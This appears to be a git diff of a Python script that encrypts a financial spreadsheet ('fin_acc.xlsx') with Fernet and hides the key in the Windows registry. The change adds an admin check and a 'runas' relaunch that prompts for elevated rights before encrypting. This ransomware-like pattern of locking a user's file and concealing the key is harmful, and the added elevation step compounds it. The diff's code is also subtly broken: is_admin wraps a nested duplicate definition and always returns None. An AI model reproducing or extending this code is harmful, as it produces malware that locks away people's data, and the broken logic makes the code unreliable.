@@ -1,6 +1,7 @@
 from cryptography.fernet import Fernet
 import winreg
 import base64
+import sys, ctypes 
 
 
 class hideKey():
@@ -91,14 +92,23 @@ class keyGenerator():
 
         return _adj_key
 
+def is_admin():
+    def is_admin():
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except Exception:
+            return False
 
 if __name__ == "__main__":
 
-    encryptFile(
-        filename="fin_acc.xlsx",
-        key=keyGenerator.gen_key()
-    ).run()
+    if is_admin():
+        encryptFile(
+            filename="fin_acc.xlsx",
+            key=keyGenerator.gen_key()
+        ).run()
 
-    hideKey(
-        adj_key=keyGenerator.adj_key()
-    ).run()
+        hideKey(
+            adj_key=keyGenerator.adj_key()
+        ).run()
+    else:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
